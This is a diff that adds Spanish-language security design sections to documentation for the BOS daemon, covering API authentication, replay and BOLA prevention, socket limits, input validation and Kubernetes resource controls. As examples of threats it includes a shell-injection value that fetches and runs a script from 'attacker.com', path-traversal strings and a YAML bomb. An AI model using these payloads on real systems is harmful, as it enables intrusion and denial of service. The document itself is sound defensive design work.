@@ -788,7 +788,635 @@ bosctl ips alerts --severity high            # Solo alertas críticas
 
 ---
 
-## 5. Flujo integrado: instalar una ficha = seguridad automática
+## 5. Protección de las Vías de Ingreso BOS (L7)
+
+Los motores anteriores (FWMAN, IPS) protegen el perímetro de red externo y el tráfico entre pods.
+Esta sección cubre el **perímetro propio del daemon BOS**: las APIs que expone a sus callers.
+Si un atacante escala privilegios en el host o compromete un daemon hermano, las defensas de red no aplican — las vías de ingreso del propio daemon son la última barrera.
+
+### 5.1 Las 4 superficies de ataque del daemon BOS
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│ SUPERFICIES DE ATAQUE PROPIAS DEL DAEMON BOS                            │
+│                                                                         │
+│  SUP-1: /run/bos/bos.sock                                              │
+│    permisos SO: 0660, grupo bosagent                                    │
+│    protocolo: WebSocket RPC (bosctl/UI) + JSON-RPC 2.0 (daemons/IA)   │
+│    amenazas: privilege escalation local · replay · message bomb ·       │
+│              slow client · BOLA · hijacking de sesión                   │
+│                                                                         │
+│  SUP-2: TCP :9443 (HTTPS TLS 1.3)                                      │
+│    callers: Kong readiness probe · Core UI                              │
+│    NetworkPolicy: solo desde namespace sbos-edge                        │
+│    amenazas: TLS bypass · DoS handshake flood · pod no autorizado       │
+│                                                                         │
+│  SUP-3: Kong Gateway :80/:443                                           │
+│    callers: navegadores del tenant (UI web)                             │
+│    amenazas: DDoS · credential stuffing · injection L7 · BOLA           │
+│                                                                         │
+│  SUP-4: JSON-RPC 2.0 inter-daemon (via Unix socket, P9)                │
+│    callers: bAuth · bkernel · biedata · agentes IA                      │
+│    amenazas: daemon comprometido suplanta identidad de otro             │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### 5.2 Autenticación por invocación — no por conexión
+
+El estándar IAM enterprise (Okta, Ping Identity, ForgeRock, IBM Security) exige verificar identidad en **cada operación**, no solo al abrir la conexión. Un atacante que hijackea una sesión WebSocket ya establecida no debe poder ejecutar ninguna operación.
+
+```go
+// Patrón obligatorio en CADA handler JSON-RPC
+func (s *Server) rpcFichaInstall(req *RPCRequest) RPCResponse {
+    // 1. Autenticación — ¿quién eres?
+    if !s.validSharedToken(req.Token) {
+        return errUnauthorized   // P4: fail-close
+    }
+
+    // 2. ctx_id obligatorio (P7 — SBOS-049)
+    callerID, ts, err := s.ctx.ValidateCtxID(req.CtxID)
+    if err != nil {
+        return errInvalidCtx
+    }
+
+    // 3. Ventana temporal — no más de 60s desde creación del ctx_id
+    if time.Since(ts) > 60*time.Second {
+        return errCtxExpired
+    }
+
+    // 4. Autorización sobre el objeto (BOLA prevention — API1:2023)
+    if !s.rbac.CallerOwns(ctx, callerID, "ficha", params.FichaID) {
+        return errForbiddenObject
+    }
+
+    // 5. Solo aquí se ejecuta la lógica de dominio
+    return s.ficha.Install(ctx, params)
+}
+```
+
+### 5.3 Replay attack prevention (RFC 7519 §4.1.7 — JTI)
+
+Un mensaje JSON-RPC capturado en el socket puede ser reenviado por un atacante.
+Dos capas de defensa independientes:
+
+**Capa 1 — ventana temporal del ctx_id (60 segundos):**
+
+```go
+// El ctx_id codifica created_at. Si llega tarde → rechazado.
+if time.Since(ctx.CreatedAt) > 60*time.Second {
+    return errReplay("ctx_id expirado")
+}
+```
+
+**Capa 2 — JTI (JWT ID) para operaciones destructivas:**
+
+Para `ficha.install`, `ficha.remove`, `tenant.create`, `tenant.remove` — irreversibles:
+
+```go
+// Check de unicidad de JTI — escrito en Redis con TTL
+const jtiTTL = 10 * time.Minute  // 2× timeout máximo de una operación destructiva
+
+jtiKey := "bos:jti:" + req.JTI
+set, _ := s.redis.SetNX(ctx, jtiKey, "1", jtiTTL)
+if !set {
+    return errReplay("JTI ya visto — posible replay attack")
+}
+// Registrar en audit log con caller_id + timestamp
+audit.Log(ctx, "jti_accepted", req.JTI, callerID)
+```
+
+### 5.4 BOLA — Broken Object Level Authorization (API1:2023 OWASP)
+
+BOLA es el #1 del OWASP API Security Top 10. El 78.5% de los bug bounty reports confirmados en 2021-2026 son BOLA. En un IAM se manifiesta como: caller autenticado opera sobre un recurso que no le pertenece.
+
+Ejemplos de BOLA en BOS:
+- `biedata` daemon invoca `bos.tenant.remove` con `tenant_id` de otro tenant
+- `bosctl` de usuario no-admin llama `bos.ficha.install` en servidor S00 (dataserver)
+- Un agente IA llama `bos.portman.assign` para un servidor lógico que no gestiona
+
+**Implementación — verificación en el data layer, no en el endpoint:**
+
+```go
+// rbac.CallerOwns — verifica en FileRBAC + BauthRBAC
+func (r *RBAC) CallerOwns(ctx context.Context, callerID, resourceType, resourceID string) bool {
+    // 1. FileRBAC: roles locales (bosctl admin siempre puede)
+    if r.file.HasPermission(callerID, resourceType, resourceID) {
+        return true
+    }
+    // 2. BauthRBAC: consulta bAuth daemon para permisos de tenant
+    allowed, _ := r.bauth.CheckPermission(ctx, callerID, resourceType, resourceID)
+    return allowed
+}
+```
+
+La verificación ocurre **antes** de tocar el dominio. No hay rutas bypaseables.
+
+### 5.5 Límites en el socket Unix — anti-bomb y anti-slow-client
+
+OWASP API4:2023 (Unrestricted Resource Consumption): sin límites, un cliente malicioso puede agotar goroutines, RAM o descriptores de archivo del daemon.
+
+```go
+// internal/server/socket.go — límites duros en Accept loop
+const (
+    maxConcurrentConnections = 100
+    maxMessageSizeBytes      = 1 * 1024 * 1024  // 1 MB
+    idleTimeout              = 30 * time.Second
+)
+
+// El listener cuenta conexiones activas antes de aceptar
+if atomic.LoadInt64(&s.activeConns) >= maxConcurrentConnections {
+    conn.Close()   // rechaza sin leer — protege contra goroutine exhaustion
+    return
+}
+
+// El reader limita tamaño antes de deserializar JSON
+limited := &io.LimitedReader{R: conn, N: maxMessageSizeBytes + 1}
+data, err := io.ReadAll(limited)
+if limited.N <= 0 {
+    conn.Close()   // message bomb — cerrar sin responder
+    return
+}
+
+// Timeout idle — previene slow client / WebSocket slowloris
+conn.SetDeadline(time.Now().Add(idleTimeout))
+```
+
+### 5.6 Kong Gateway — plugins de seguridad L7 activos
+
+Kong 3.9 LTS activa estos plugins por route, derivados del `manifest.yml` de cada ficha vía `bos.fwman.policy.sync`. Sin configuración manual:
+
+```yaml
+# Generado por bos.fwman.policy.sync — no editar manualmente
+plugins:
+- name: injection-protection          # Kong 3.9: SQL, XSS, SSI, XPath, Java Exception
+  config: { enforce_mode: block }
+
+- name: request-validator             # JSON Schema del body — derivado del manifest
+  config:
+    body_schema: |
+      {"type":"object","properties":{"ficha_id":{"type":"string","pattern":"^[a-z0-9][a-z0-9\\-_]{1,63}$"}}}
+
+- name: json-threat-protection        # Previene JSON bomb
+  config:
+    max_array_element_count: 1000
+    max_container_depth: 5
+    max_object_entry_count: 100
+    max_string_value_length: 65536
+
+- name: rate-limiting
+  config: { minute: 100, policy: local }   # por IP
+
+- name: request-size-limiting
+  config: { allowed_payload_size: 10 }     # MB
+
+- name: bot-detection
+  config: { deny: [] }                     # denylist default Kong
+
+- name: ip-restriction
+  config:
+    deny: []                               # sincronizado con @crowdsec_blacklist cada hora
+```
+
+### 5.7 mTLS inter-daemon — identidad de workload con SPIFFE/SPIRE
+
+Para SUP-4 (comunicación entre daemons vía Unix socket), las capas de autenticación son:
+
+| Capa | Mecanismo | Cuándo |
+|------|-----------|--------|
+| SO | socket 0660, grupo `bosagent` | Siempre (ya activo) |
+| Aplicación | shared token + ctx_id | Siempre (ya activo) |
+| SPIFFE/SPIRE | SVID X.509 → mTLS + verificación de `spiffe://sbos.cluster/daemon/<id>` | Fase 2 CERTMAN |
+
+El SPIFFE URI de cada daemon es inmutable y verificable: `spiffe://sbos.cluster/daemon/bos`,
+`spiffe://sbos.cluster/daemon/bauth`, etc. Un daemon comprometido que no tenga el SVID correcto
+es rechazado en la conexión, antes de que llegue al shared token.
+
+---
+
+## 6. Sanitización y Validación de Inputs
+
+### 6.1 Por qué es la amenaza más alta en un IAM
+
+Un IAM gestiona identidades y permisos de toda la infraestructura. Un input malicioso puede:
+- **Path traversal** → leer el `manifest.yml` de keycloak y extraer sus secrets
+- **Shell injection** → obtener root shell en el host desde un parámetro de ficha
+- **YAML bomb** → crashear el parser → DoS del instalador
+- **BOLA vía ID malformado** → acceder a fichas ajenas con un ID forjado
+
+### 6.2 Mapa completo de vectores — BOS como target
+
+| # | Input | Destino | Vector | OWASP | Severidad |
+|---|-------|---------|--------|-------|:---------:|
+| V1 | `ficha_id` | `servers/<server>/<ficha_id>/manifest.yml` | Path traversal | API1+API3 | CRÍTICA |
+| V2 | `server` | `servers/<server>/` | Path traversal | API1 | CRÍTICA |
+| V3 | Parámetros a `task_catalog.sh` | bash subprocess | Shell injection (OS Cmd) | API3 | CRÍTICA |
+| V4 | `resources/*.yaml` via kubectl | kube-apiserver | YAML injection · priv esc | API3 | ALTA |
+| V5 | `domain`, `tenant_name` | nginx conf · realm | Config injection | API3 | ALTA |
+| V6 | `namespace` | kubectl namespace | Namespace escape | API1 | ALTA |
+| V7 | Cuerpo de `manifest.yml` | Go YAML parser | YAML bomb (billion laughs) | API4 | MEDIA |
+| V8 | `port` (int) | nftables · Kardex | Integer overflow | API3 | MEDIA |
+| V9 | Queries al Kardex | PostgreSQL | SQL injection | API3 | BAJA ✅ |
+
+### 6.3 V1 + V2 — Path traversal: solución Go 1.24
+
+**El problema con `filepath.Clean()` en Go:**
+
+```go
+// filepath.Clean normaliza sintácticamente pero NO impide escapar del directorio base
+filepath.Clean("../../etc/passwd")  // → "../../etc/passwd" — sigue siendo peligroso
+filepath.Join(base, "../../etc/passwd")  // → "/etc/passwd" — escape exitoso
+```
+
+**Solución primaria — whitelist regex (nada que no coincida llega al filesystem):**
+
+```go
+// internal/server/validation.go
+var (
+    reFichaID   = regexp.MustCompile(`^[a-z0-9][a-z0-9\-_]{1,63}$`)
+    reServer    = regexp.MustCompile(`^S(0[0-9]|1[0-7])$`)           // S00-S17, whitelist estricta
+    reNamespace = regexp.MustCompile(`^[a-z0-9][a-z0-9\-]{0,62}$`)   // RFC 1123
+    reDomain    = regexp.MustCompile(`^[a-z0-9][a-z0-9\-]{1,61}[a-z0-9](\.[a-z0-9][a-z0-9\-]{0,61}[a-z0-9])*$`)
+)
+
+func ValidateFichaParams(fichaID, server, ns string) error {
+    if !reFichaID.MatchString(fichaID) {
+        return fmt.Errorf("ficha_id inválido: %q (solo [a-z0-9-_], 2-64 chars)", fichaID)
+    }
+    if !reServer.MatchString(server) {
+        return fmt.Errorf("servidor inválido: %q (esperado S00-S17)", server)
+    }
+    if ns != "" && !reNamespace.MatchString(ns) {
+        return fmt.Errorf("namespace inválido: %q (RFC 1123)", ns)
+    }
+    return nil
+}
+```
+
+**Solución secundaria — `os.Root` (Go 1.24), red de seguridad si la whitelist falla:**
+
+```go
+// os.Root confina TODAS las operaciones de archivo a un directorio base
+// Rechaza "..", paths absolutos, y symlinks que escapen del root
+fichasRoot, err := os.OpenRoot(paths.EtcBos + "/servers")
+if err != nil {
+    return err
+}
+defer fichasRoot.Close()
+
+// Seguro: fichaID ya pasó la whitelist, pero os.Root es la red de seguridad
+f, err := fichasRoot.Open(fichaID + "/manifest.yml")
+if err != nil {
+    return fmt.Errorf("ficha no encontrada: %w", err)
+}
+```
+
+### 6.4 V3 — Shell injection: `exec.Command` con args separados
+
+**Principio (OWASP + Snyk Go guide):** Nunca construir string de shell interpolando input.
+El shell interpreta metacaracteres (`;`, `|`, `$()`, `` ` ``, `&`) antes de ejecutar.
+
+```go
+// INCORRECTO — cualquier fichaID puede inyectar comandos
+cmd := exec.Command("sh", "-c", "task_catalog.sh "+fichaID+" install")
+// fichaID = "; curl attacker.com/shell.sh | bash #"  → ejecución arbitraria
+
+// CORRECTO — exec.Command sin shell, args como slice, input en env vars
+cmd := exec.Command(filepath.Join(fichaPath, "task_catalog.sh"), "install")
+cmd.Env = append(baseEnv(),
+    "FICHA_ID="+fichaID,         // validado por reFichaID antes de llegar aquí
+    "SERVER="+server,            // validado por reServer
+    "NAMESPACE="+namespace,      // validado por reNamespace
+    "CTX_ID="+ctxID,
+)
+cmd.Dir = fichaPath
+```
+
+En cada `task_catalog.sh` — **strict mode + double-quote es obligatorio:**
+
+```bash
+#!/bin/bash
+set -euo pipefail       # exit on error, undefined var, pipe failure
+
+# CORRECTO — variables entre comillas dobles siempre
+apt-get install -y "${PACKAGE_NAME}"
+kubectl apply -f "${MANIFEST_PATH}" --namespace="${NAMESPACE}"
+
+# INCORRECTO — vulnerable a word splitting y globbing
+apt-get install -y $PACKAGE_NAME
+```
+
+PortSwigger advierte explícitamente: *"Never try to sanitize input by escaping shell metacharacters"* — es bypasseable por atacantes expertos. La única defensa robusta es no invocar el shell.
+
+### 6.5 V7 — YAML bomb: límite de tamaño + firma de release
+
+Un YAML con anchors anidados puede expandirse exponencialmente:
+
+```yaml
+# 8 líneas → 100 millones de cadenas en RAM → OOM del parser
+a: &a "aaaaaaaaaaaaaaaaaaaaaa"
+b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a, *a]
+c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b, *b]
+d:    [*c, *c, *c, *c, *c, *c, *c, *c, *c, *c]
+```
+
+**Mitigación 1 — límite de tamaño antes del parse (defensa universal):**
+
+```go
+const maxManifestBytes = 512 * 1024  // 512 KB — ningún manifest legítimo es mayor
+
+f, _ := os.Open(manifestPath)
+limited := &io.LimitedReader{R: f, N: int64(maxManifestBytes) + 1}
+data, _ := io.ReadAll(limited)
+if limited.N <= 0 {
+    return fmt.Errorf("manifest.yml supera %d KB — rechazado", maxManifestBytes/1024)
+}
+var manifest FichaManifest
+if err := yaml.Unmarshal(data, &manifest); err != nil {
+    return fmt.Errorf("manifest.yml inválido: %w", err)
+}
+```
+
+**Mitigación 2 — firma Ed25519 del release plane (defensa primaria en producción):**
+
+Los manifests vienen del SKULL Release Server con firma Ed25519. La verificación ocurre antes del parse — un manifest sin firma válida se descarta antes de tocar el parser.
+
+### 6.6 V9 — SQL injection: ya mitigado en todo el codebase
+
+`PgKardex` en `internal/portman/kardex.go` usa placeholders `$1, $2, ...` en todas las queries. No existe `fmt.Sprintf` en ninguna query. Este patrón es **obligatorio en todo nuevo código** que acceda a PostgreSQL:
+
+```go
+// CORRECTO — siempre (ya implementado en PgKardex)
+const q = `SELECT port, service_name FROM bos.prt_port_assignment
+           WHERE ficha_id = $1 AND status = $2`
+rows, err := db.QueryContext(ctx, q, fichaID, "assigned")
+
+// INCORRECTO — prohibido por convención de codebase
+q := fmt.Sprintf("SELECT ... WHERE ficha_id = '%s'", fichaID)
+```
+
+### 6.7 Flujo de validación obligatorio — 6 pasos en todo handler
+
+```
+Handler JSON-RPC recibe req
+  │
+  ├─[1] Autenticación      validSharedToken(req.Token) → err → HTTP 401
+  │
+  ├─[2] Autorización BOLA  rbac.CallerOwns(callerID, resource, id) → err → HTTP 403
+  │
+  ├─[3] Replay check       ctx_id timestamp < 60s + jti SetNX → err → HTTP 409
+  │       (solo ops destructivas: install, remove, tenant.create, tenant.remove)
+  │
+  ├─[4] Validación whitelist  ValidateFichaParams(fichaID, server, ns) → err → HTTP 400
+  │       (todo string que llegue a filesystem, shell o K8s)
+  │
+  ├─[5] Size check         len(blob) ≤ maxManifestBytes → err → HTTP 413
+  │       (solo cuando el body incluye contenido inline: manifests, configs)
+  │
+  └─[6] Lógica de dominio  s.domain.DoOperation(ctx, params)
+```
+
+Un handler que salte cualquier paso de 1-5 es una **vulnerabilidad confirmada** que el Revisor debe rechazar.
+
+---
+
+## 7. Protección de Recursos y Anti-Abuso
+
+### 7.1 OWASP API4:2023 — Unrestricted Resource Consumption
+
+Para un IAM enterprise, el agotamiento de recursos es tan devastador como un breach de datos: el instalador queda inaccesible y el despliegue de toda la infraestructura se detiene.
+
+BOS aplica límites en 5 capas independientes:
+
+```
+Capa 1 — Socket Unix         : conexiones, tamaño mensaje, timeouts, rate por UID
+Capa 2 — Respuestas          : paginación obligatoria, max 500 rows
+Capa 3 — Base de datos       : connection pool (ya en PgKardex: 4 open, 2 idle)
+Capa 4 — K8s API             : circuit breaker — 3 fallos → OPEN 30s
+Capa 5 — Pods K8s            : ResourceQuota + LimitRange por namespace
+```
+
+### 7.2 Rate limiting por UID del proceso (Unix socket)
+
+El socket Unix permite identificar al caller por UID del proceso (syscall `SO_PEERCRED`).
+Este mecanismo es más robusto que IP-based: el UID no se puede spoofear desde el mismo host.
+
+```go
+// Obtener UID del peer — Linux (go 1.21+)
+func peerUID(conn net.Conn) (uint32, error) {
+    uc, ok := conn.(*net.UnixConn)
+    if !ok {
+        return 0, fmt.Errorf("no es UnixConn")
+    }
+    raw, _ := uc.SyscallConn()
+    var cred *syscall.Ucred
+    raw.Control(func(fd uintptr) {
+        cred, _ = syscall.GetsockoptUcred(int(fd), syscall.SOL_SOCKET, syscall.SO_PEERCRED)
+    })
+    if cred == nil {
+        return 0, fmt.Errorf("SO_PEERCRED no disponible")
+    }
+    return cred.Uid, nil
+}
+```
+
+Límites diferenciados por categoría de operación y UID:
+
+| Categoría | Métodos | Límite por UID/min | Por qué |
+|-----------|---------|:-----------------:|---------|
+| Destructivo | ficha.install/remove · tenant.create/remove | 10 | Operaciones irreversibles |
+| Mutación | portman.assign · certman.issue · fwman.sync | 60 | I/O DB + K8s |
+| Consulta | status · list · lookup · check · export | ∞ | Read-only, sin side effects |
+
+Implementación: sliding window con `sync.Map[uid → []time.Time]`. Sin Redis externo — el estado vive en memoria del proceso BOS.
+
+### 7.3 Timeouts por categoría de método
+
+```go
+// internal/server/timeouts.go
+var methodTimeouts = map[string]time.Duration{
+    // Consulta inmediata (DB read + state.Manager)
+    "bos.ficha.status":         5 * time.Second,
+    "bos.ficha.list":           5 * time.Second,
+    "bos.portman.lookup":       5 * time.Second,
+    "bos.portman.list":         5 * time.Second,
+    "bos.portman.check":        5 * time.Second,
+    "bos.certman.list":         5 * time.Second,
+    "bos.ips.status":           5 * time.Second,
+
+    // Operación estándar (DB write + K8s API call)
+    "bos.portman.assign":       30 * time.Second,
+    "bos.certman.issue":        30 * time.Second,
+    "bos.fwman.policy.sync":    30 * time.Second,
+    "bos.portman.validate":     30 * time.Second,
+
+    // Ciclo de vida de fichas (pull imagen + startup K8s)
+    "bos.ficha.install":        300 * time.Second,
+    "bos.ficha.repair":         300 * time.Second,
+    "bos.ficha.remove":         120 * time.Second,
+    "bos.ficha.scale":          60 * time.Second,
+
+    // Bootstrap día 0 (kubeadm + stack completo)
+    "bos.bootstrap.start":      3600 * time.Second,
+}
+
+// Uso en dispatcher
+func (s *Server) dispatch(req *RPCRequest) RPCResponse {
+    timeout, ok := methodTimeouts[req.Method]
+    if !ok {
+        timeout = 30 * time.Second  // default seguro
+    }
+    ctx, cancel := context.WithTimeout(req.Context, timeout)
+    defer cancel()
+    return s.registry[req.Method](ctx, req)
+}
+```
+
+### 7.4 Paginación obligatoria — sin listas ilimitadas
+
+Ningún método de listado retorna resultados sin límite (protege contra escaneo de tabla completa):
+
+```go
+const (
+    defaultPageSize = 100
+    maxPageSize     = 500  // nunca más de 500 rows en una sola respuesta
+)
+
+func parseListParams(raw map[string]interface{}) (limit, offset int) {
+    limit = defaultPageSize
+    if v, ok := raw["limit"].(float64); ok {
+        limit = min(int(v), maxPageSize)
+    }
+    if v, ok := raw["offset"].(float64); ok {
+        offset = max(0, int(v))
+    }
+    return
+}
+```
+
+### 7.5 Circuit breaker para K8s API
+
+Si el kube-apiserver no responde, BOS no puede bloquear indefinidamente goroutines esperando kubectl:
+
+```
+Estado CLOSED
+  │ llamadas normales
+  │ fallo HTTP 5xx / timeout → contador++
+  │ 3 fallos consecutivos
+  ▼
+Estado OPEN (30 segundos)
+  │ bos.ficha.status → cached state de state.Manager (P8)
+  │ bos.ficha.install → error JSON-RPC -32001 "K8s API no disponible"
+  │ bos.portman.validate → error JSON-RPC -32001
+  │ 30 segundos transcurridos
+  ▼
+Estado HALF-OPEN
+  │ 1 llamada de prueba a kube-apiserver
+  │ éxito → CLOSED
+  └ fallo → OPEN (reinicia timer)
+
+Implementación: atomic.Int32 para estado + time.Time para timer
+Todo en k8s.Core (Principio P1) — no en cada operación individual
+```
+
+### 7.6 K8s ResourceQuota y LimitRange — generados automáticamente
+
+`bos.fwman.policy.sync` aplica estos objetos en cada namespace SBOS al instalar la primera ficha.
+Previene pod runaway, OOM cascada, y DDoS interno entre fichas:
+
+```yaml
+# Generado por bos.fwman.policy.sync — fuente de verdad: config NetMan
+apiVersion: v1
+kind: ResourceQuota
+metadata:
+  name: sbos-quota
+  namespace: sbos-<zona>         # sbos-identity, sbos-data, sbos-apps, etc.
+spec:
+  hard:
+    requests.cpu: "4"
+    requests.memory: "8Gi"
+    limits.cpu: "8"
+    limits.memory: "16Gi"
+    pods: "50"
+    services: "20"
+    persistentvolumeclaims: "10"
+---
+apiVersion: v1
+kind: LimitRange
+metadata:
+  name: sbos-limits
+  namespace: sbos-<zona>
+spec:
+  limits:
+  - type: Container
+    default:        { cpu: "500m",  memory: "512Mi" }
+    defaultRequest: { cpu: "100m",  memory: "128Mi" }
+    max:            { cpu: "4",     memory: "4Gi"   }
+    min:            { cpu: "10m",   memory: "32Mi"  }
+```
+
+### 7.7 PodSecurityStandard: restricted en todos los namespaces SBOS
+
+```yaml
+# Label en cada namespace SBOS — aplicado por bos.fwman.policy.sync
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: sbos-<zona>
+  labels:
+    pod-security.kubernetes.io/enforce: restricted   # K8s PSA GA desde v1.25
+    pod-security.kubernetes.io/audit: restricted
+    pod-security.kubernetes.io/warn: restricted
+```
+
+Restricciones que impone `restricted`:
+- `runAsNonRoot: true` — sin root en containers
+- `allowPrivilegeEscalation: false`
+- `seccompProfile: RuntimeDefault`
+- `capabilities: drop: ["ALL"]`
+- Sin `hostNetwork`, `hostPID`, `hostIPC`
+- Sin `hostPath` volumes no declarados en manifest
+
+Un pod que viola cualquier restricción es rechazado por el API server antes de scheduling.
+
+### 7.8 Diagrama de defensa completa
+
+```
+[Internet] ──► nftables SYNPROXY + CrowdSec @blacklist
+                 SYN flood, UDP flood, IPs maliciosas → DROP kernel (nanosegundos)
+
+[Pasa L3/L4] ──► Kong Gateway :443
+                  rate-limiting 100/min/IP, injection-protection, json-threat-protection
+                  bot-detection, request-size-limiting 10MB → HTTP 429 / 400
+
+[Pasa Kong] ──► TCP :9443 (NetworkPolicy: solo sbos-edge)
+                 TLS 1.3 (Vault PKI), solo pods en sbos-edge pueden conectar
+
+[Compromiso interno] ──► /run/bos/bos.sock
+                          permisos SO 0660/bosagent → sin grupo, sin acceso
+                          autenticación por invocación (ctx_id + token) → P4 fail-close
+                          replay prevention (ts 60s + jti SetNX) → mensaje robado inútil
+                          BOLA prevention (callerOwns) → no puede operar recursos ajenos
+                          rate limit por UID SO (SO_PEERCRED) → 10 destroy/min máximo
+                          message size 1MB → JSON bomb rechazado antes de parse
+                          idle timeout 30s → slow client expulsado
+
+[Parámetro malicioso en RPC] ──► Validación de inputs
+                                  whitelist regex (fichaID, server, ns, domain) → reject
+                                  os.Root (Go 1.24) → path traversal imposible
+                                  exec.Command args separados → shell injection imposible
+                                  límite 512KB + firma Ed25519 → YAML bomb imposible
+                                  $1 $2 placeholders → SQL injection imposible
+
+[Pod comprometido] ──► NetworkPolicy deny-all
+                        no puede contactar otros pods sin allow explícito
+                        SPIFFE/SPIRE SVID → sin identidad válida, daemon rechaza
+                        ResourceQuota + LimitRange → no puede agotar recursos del nodo
+                        PodSecurityStandard restricted → sin escalada de privilegios
+```
+
+---
+
+## 8. Flujo integrado: instalar una ficha = seguridad automática
 
 ```
 bosctl ficha install postgresql
@@ -828,7 +1456,7 @@ RESULTADO: postgresql instalada, puerto asignado, certificado emitido,
 
 ---
 
-## 6. DDL propuesto — Nuevas tablas
+## 9. DDL propuesto — Nuevas tablas
 
 ```sql
 -- T-413: Kardex de Certificados (ver §2.7 para DDL completo)
@@ -859,7 +1487,7 @@ CREATE INDEX idx_net_events_src_ip   ON bos.net_security_events(src_ip) WHERE sr
 
 ---
 
-## 7. Validación con normas internacionales
+## 10. Validación con normas internacionales
 
 | Norma | Requerimiento | Motor que lo cumple |
 |-------|-------------|---------------------|
@@ -875,7 +1503,7 @@ CREATE INDEX idx_net_events_src_ip   ON bos.net_security_events(src_ip) WHERE sr
 
 ---
 
-## 8. Estructura de código — roadmap de implementación
+## 11. Estructura de código — roadmap de implementación
 
 ```
 BosAgent/src/internal/
@@ -926,7 +1554,7 @@ BosAgent/src/internal/
 
 ---
 
-## 9. Métodos JSON-RPC completos del NetMan
+## 12. Métodos JSON-RPC completos del NetMan
 
 ```
 bos.portman.assign   bos.portman.lookup   bos.portman.release
@@ -945,7 +1573,7 @@ bos.ips.status  bos.ips.blacklist.list  bos.ips.blacklist.unblock  bos.ips.alert
 
 ---
 
-## 10. Experiencias de industria que validan este diseño
+## 13. Experiencias de industria que validan este diseño
 
 | Organización / Herramienta | Patrón adoptado por SBOS |
 |---------------------------|--------------------------|
